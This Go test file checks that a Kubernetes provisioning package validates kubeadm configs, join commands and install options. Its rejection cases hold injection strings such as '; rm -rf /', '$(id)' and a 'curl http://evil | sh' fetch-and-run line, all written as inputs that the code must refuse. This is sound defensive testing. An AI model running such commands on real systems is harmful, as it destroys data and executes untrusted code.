package provision

import (
	"context"
	"strings"
	"testing"
	"time"
)

const goodJoin = "kubeadm join 10.0.0.5:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:" +
	"0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

// fakeRunner records the scripts it is asked to run and replays canned output.
type fakeRunner struct {
	scripts []string
	output  []string // lines emitted for every Run
	capture string
	err     error
}

func (f *fakeRunner) Run(_ context.Context, script string, onLine func(string)) error {
	f.scripts = append(f.scripts, script)
	for _, l := range f.output {
		onLine(l)
	}
	return f.err
}

func (f *fakeRunner) Capture(_ context.Context, script string) (string, error) {
	f.scripts = append(f.scripts, script)
	return f.capture, f.err
}

func (f *fakeRunner) Close() error { return nil }

func TestDefaultKubeadmConfigIsValid(t *testing.T) {
	c := DefaultKubeadmConfig()
	if err := c.Validate(); err != nil {
		t.Fatal(err)
	}
	if c.DefaultMinor() == "" || !c.HasMinor(c.DefaultMinor()) {
		t.Error("the default minor must be one of the supported minors")
	}
	flannel, ok := c.CNI("")
	if !ok || flannel.Name != "flannel" || flannel.PodCIDR != "10.244.0.0/16" {
		t.Errorf("default CNI: %+v", flannel)
	}
	// every CNI is pinned: a version tag, and that exact tag is in the manifest URL
	for _, n := range c.CNIs {
		if !strings.Contains(n.Manifest, n.Version) {
			t.Errorf("%s manifest %s isn't pinned to %s", n.Name, n.Manifest, n.Version)
		}
		if strings.Contains(n.Manifest, "latest") || strings.Contains(n.Manifest, "/master/") || strings.Contains(n.Manifest, "/main/") {
			t.Errorf("%s manifest floats: %s", n.Name, n.Manifest)
		}
	}
}

func TestKubeadmConfigRejectsUnsafeOrIncomplete(t *testing.T) {
	good := DefaultKubeadmConfig()
	mutate := func(f func(*KubeadmConfig)) KubeadmConfig {
		c := DefaultKubeadmConfig()
		c.Versions = append([]KubeadmVersion(nil), good.Versions...)
		c.CNIs = append([]KubeadmCNI(nil), good.CNIs...)
		f(&c)
		return c
	}
	cases := map[string]KubeadmConfig{
		"no default version":   mutate(func(c *KubeadmConfig) { c.Versions[0].Default = false }),
		"two default versions": mutate(func(c *KubeadmConfig) { c.Versions[1].Default = true }),
		"bad minor":            mutate(func(c *KubeadmConfig) { c.Versions[0].Minor = "1.37; id" }),
		"http manifest":        mutate(func(c *KubeadmConfig) { c.CNIs[0].Manifest = "http://example.com/x.yml" }),
		"manifest with creds":  mutate(func(c *KubeadmConfig) { c.CNIs[0].Manifest = "https://u:p@example.com/x.yml" }),
		"unpinned cni version": mutate(func(c *KubeadmConfig) { c.CNIs[0].Version = "latest" }),
		"bad pod cidr":         mutate(func(c *KubeadmConfig) { c.CNIs[0].PodCIDR = "10.0.0.0" }),
		"duplicate cni":        mutate(func(c *KubeadmConfig) { c.CNIs[1].Name = c.CNIs[0].Name }),
		"no cni":               {Versions: good.Versions},
	}
	for name, c := range cases {
		if err := c.Validate(); err == nil {
			t.Errorf("%s should be rejected", name)
		}
	}
}

func TestValidateJoinCommand(t *testing.T) {
	k := Kubeadm{}
	for _, ok := range []string{
		goodJoin,
		goodJoin + "\n",
		strings.Replace(goodJoin, "10.0.0.5", "cp.example.com", 1),
		strings.Replace(goodJoin, "10.0.0.5", "[fd00::1]", 1),
	} {
		if err := k.ValidateJoinToken(Secret(ok)); err != nil {
			t.Errorf("%q should be accepted: %v", ok, err)
		}
	}
	for name, bad := range map[string]string{
		"control-plane join":   goodJoin + " --control-plane --certificate-key 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
		"shell injection":      goodJoin + "; rm -rf /",
		"command substitution": strings.Replace(goodJoin, "10.0.0.5", "$(id)", 1),
		"extra flag":           goodJoin + " --ignore-preflight-errors=all",
		"not a join command":   "curl http://evil | sh",
		"short token":          strings.Replace(goodJoin, "abcdef.0123456789abcdef", "abc.def", 1),
		"bad hash":             strings.Replace(goodJoin, "sha256:0123", "sha256:zzzz", 1),
		"newline smuggling":    goodJoin + "\nrm -rf /",
		"empty":                "",
	} {
		if err := k.ValidateJoinToken(Secret(bad)); err == nil {
			t.Errorf("%s should be rejected: %q", name, bad)
		}
	}
}

func TestJoinEndpointComesFromTheCommand(t *testing.T) {
	ep, err := Kubeadm{}.JoinEndpoint("ignored", Secret(goodJoin))
	if err != nil || ep != "https://10.0.0.5:6443" {
		t.Fatalf("%q %v", ep, err)
	}
	if _, err := (K3s{}).JoinEndpoint("", "x"); err == nil {
		t.Error("k3s needs an explicit server URL")
	}
}

func TestJoinWorkerRebuildsAQuotedCommand(t *testing.T) {
	f := &fakeRunner{}
	err := Kubeadm{}.JoinWorker(context.Background(), f, JoinInfo{Token: Secret(goodJoin + "\n"), NodeName: "worker-1"}, func(string) {})
	if err != nil {
		t.Fatal(err)
	}
	script := f.scripts[0]
	if !strings.Contains(script, "kubeadm join '10.0.0.5:6443' --token 'abcdef.0123456789abcdef'") {
		t.Errorf("join command isn't rebuilt from quoted parts:\n%s", script)
	}
	if !strings.Contains(script, "--node-name 'worker-1'") {
		t.Errorf("node name missing:\n%s", script)
	}
	if err := (Kubeadm{}).JoinWorker(context.Background(), f, JoinInfo{Token: Secret(goodJoin + "; id")}, func(string) {}); err == nil {
		t.Error("a poisoned join command must not run")
	}
}

func TestInstallControlPlaneScript(t *testing.T) {
	k := Kubeadm{Config: DefaultKubeadmConfig()}
	flannel, _ := k.Config.CNI("flannel")
	calico, _ := k.Config.CNI("calico")

	s := k.installControlPlaneScript(ControlPlaneOptions{TLSSAN: "203.0.113.9"}, flannel)
	for _, want := range []string{
		"--pod-network-cidr='10.244.0.0/16'", // the CIDR the CNI expects
		"--apiserver-cert-extra-sans='203.0.113.9'",
		flannel.Manifest, "kubectl wait --for=condition=Ready node", "rollout status deployment/coredns",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("missing %q in:\n%s", want, s)
		}
	}
	if strings.Contains(s, "taint") || strings.Contains(s, "control-plane-endpoint") || strings.Contains(s, "ignore-preflight") {
		t.Errorf("optional parts must be absent by default:\n%s", s)
	}

	s = k.installControlPlaneScript(ControlPlaneOptions{
		TLSSAN:  "cp.example.com",
		Kubeadm: KubeadmOptions{SingleNode: true, ControlPlaneEndpoint: "k8s.example.com:6443", IgnorePreflightErrors: []string{"NumCPU", "Mem"}},
	}, calico)
	for _, want := range []string{"--pod-network-cidr='192.168.0.0/16'", "node-role.kubernetes.io/control-plane-", "--control-plane-endpoint='k8s.example.com:6443'", "--ignore-preflight-errors='NumCPU,Mem'"} {
		if !strings.Contains(s, want) {
			t.Errorf("missing %q in:\n%s", want, s)
		}
	}
}

func TestInstallControlPlaneRejectsBadInput(t *testing.T) {
	k := Kubeadm{Config: DefaultKubeadmConfig()}
	f := &fakeRunner{}
	good := ControlPlaneOptions{TLSSAN: "10.0.0.5", Kubeadm: KubeadmOptions{Minor: k.Config.DefaultMinor()}}
	if err := k.InstallControlPlane(context.Background(), f, good, func(string) {}); err != nil {
		t.Fatalf("a valid request should run: %v", err)
	}
	f.scripts = nil
	bad := map[string]ControlPlaneOptions{
		"injection in the SAN":      {TLSSAN: "1.2.3.4; id", Kubeadm: good.Kubeadm},
		"unsupported minor":         {TLSSAN: "10.0.0.5", Kubeadm: KubeadmOptions{Minor: "1.2"}},
		"unknown CNI":               {TLSSAN: "10.0.0.5", Kubeadm: KubeadmOptions{Minor: good.Kubeadm.Minor, CNI: "evil"}},
		"injection in the endpoint": {TLSSAN: "10.0.0.5", Kubeadm: KubeadmOptions{Minor: good.Kubeadm.Minor, ControlPlaneEndpoint: "a;b"}},
		"bad ignore name":           {TLSSAN: "10.0.0.5", Kubeadm: KubeadmOptions{Minor: good.Kubeadm.Minor, IgnorePreflightErrors: []string{"x; id"}}},
	}
	for name, o := range bad {
		if err := k.InstallControlPlane(context.Background(), f, o, func(string) {}); err == nil {
			t.Errorf("%s must be rejected", name)
		}
	}
	if len(f.scripts) != 0 {
		t.Errorf("nothing may be run for rejected input, ran %d script(s)", len(f.scripts))
	}
}

func TestNormalizeKubeadmOptionsFillsDefaults(t *testing.T) {
	cfg := DefaultKubeadmConfig()
	o, err := NormalizeKubeadmOptions(cfg, KubeadmOptions{})
	if err != nil || o.Minor != cfg.DefaultMinor() || o.CNI != "flannel" {
		t.Fatalf("%+v %v", o, err)
	}
	if _, err := NormalizeKubeadmOptions(cfg, KubeadmOptions{Minor: "1.1"}); err == nil {
		t.Error("an unsupported minor must be refused")
	}
}

func TestPrepareNodeOnlyForConfiguredMinors(t *testing.T) {
	k := Kubeadm{Config: DefaultKubeadmConfig()}
	f := &fakeRunner{}
	if err := k.PrepareNode(context.Background(), f, PrepareOptions{K8sMinor: "1.1"}, func(string) {}); err == nil {
		t.Error("an unsupported minor must be refused")
	}
	if err := k.PrepareNode(context.Background(), f, PrepareOptions{}, func(string) {}); err != nil {
		t.Fatal(err)
	}
	s := f.scripts[0]
	for _, want := range []string{"swapoff -a", "/etc/modules-load.d/k8s.conf", "br_netfilter", "ip_forward", "SystemdCgroup = true", "apt-mark hold kubelet kubeadm kubectl", "MINOR=" + k.Config.DefaultMinor()} {
		if !strings.Contains(s, want) {
			t.Errorf("prepare script is missing %q", want)
		}
	}
}

func TestPreflightParsesFactsAndErrors(t *testing.T) {
	f := &fakeRunner{output: []string{
		"FACT:hostname=Worker-2", "FACT:arch=x86_64", "FACT:os=Ubuntu 24.04", "FACT:cpus=4", "FACT:memkb=8000000",
		"FACT:product_uuid=ABCDEF-123", "FACT:epoch=1700000000", "preflight ok",
	}}
	facts, err := Kubeadm{}.Preflight(context.Background(), f, JoinInfo{ServerURL: "https://10.0.0.5:6443"}, func(string) {})
	if err != nil {
		t.Fatal(err)
	}
	if facts.Hostname != "worker-2" || facts.CPUs != 4 || facts.MemKB != 8000000 || facts.ProductUUID != "abcdef-123" || facts.Epoch != 1700000000 {
		t.Errorf("facts: %+v", facts)
	}

	f = &fakeRunner{output: []string{"ERROR: kubeadm needs at least 2 CPUs (this machine has 1)"}, err: context.DeadlineExceeded}
	if _, err := (Kubeadm{}).PreflightControlPlane(context.Background(), f, func(string) {}); err == nil || !strings.Contains(err.Error(), "at least 2 CPUs") {
		t.Errorf("the script's own ERROR line should become the error, got %v", err)
	}
}

func TestCheckAgainstCluster(t *testing.T) {
	existing := []NodeIdentity{{Name: "cp-1", SystemUUID: "aaaa-1111"}, {Name: "w-1", SystemUUID: "bbbb-2222"}}
	now := time.Now().Unix()
	ok := NodeFacts{Hostname: "w-9", ProductUUID: "cccc-3333", Epoch: now}
	if err := checkAgainstCluster(context.Background(), ok, existing, nil); err != nil {
		t.Errorf("a unique machine should pass: %v", err)
	}
	for name, facts := range map[string]NodeFacts{
		"duplicate hostname (any case)": {Hostname: "W-1", ProductUUID: "cccc-3333", Epoch: now},
		"duplicate product_uuid":        {Hostname: "w-9", ProductUUID: "BBBB-2222", Epoch: now},
		"clock far in the past":         {Hostname: "w-9", Epoch: now - 600},
		"clock far in the future":       {Hostname: "w-9", Epoch: now + 600},
	} {
		if err := checkAgainstCluster(context.Background(), facts, existing, nil); err == nil {
			t.Errorf("%s must be refused", name)
		}
	}
}

func TestMinorOf(t *testing.T) {
	for in, want := range map[string]string{
		"v1.36.5": "1.36", "1.37": "1.37", "v1.35.5+k3s1": "1.35", "": "", "garbage": "",
	} {
		if got := minorOf(in); got != want {
			t.Errorf("minorOf(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestResetScripts(t *testing.T) {
	f := &fakeRunner{}
	if err := (Kubeadm{}).Reset(context.Background(), f, func(string) {}); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"kubeadm reset -f", "/etc/cni/net.d", "iptables", "flannel.1"} {
		if !strings.Contains(f.scripts[0], want) {
			t.Errorf("kubeadm reset script is missing %q", want)
		}
	}
	f = &fakeRunner{}
	if err := (K3s{}).Reset(context.Background(), f, func(string) {}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(f.scripts[0], "k3s-agent-uninstall.sh") || !strings.Contains(f.scripts[0], "k3s-uninstall.sh") {
		t.Errorf("k3s reset must use k3s's own uninstall scripts:\n%s", f.scripts[0])
	}
}

func TestKubeadmPreflightRefusesNonDebian(t *testing.T) {
	// the script itself carries the OS gate: check its text, and that the two
	// preflights share the same base checks.
	for name, s := range map[string]string{"control plane": kubeadmBase + kubeadmControlPlanePorts, "worker": kubeadmBase + kubeadmWorkerChecks} {
		for _, want := range []string{"Debian and Ubuntu only", "at least 2 CPUs", "pkgs.k8s.io", "registry.k8s.io", "already belongs to a Kubernetes cluster", "NTP-synchronized"} {
			if !strings.Contains(s, want) {
				t.Errorf("%s preflight is missing %q", name, want)
			}
		}
	}
	if !strings.Contains(kubeadmControlPlanePorts, "6443 2379 2380 10250") || !strings.Contains(kubeadmControlPlanePorts, "10259") {
		t.Error("the control-plane preflight must check 6443, 2379-2380 and 10250-10259")
	}
}
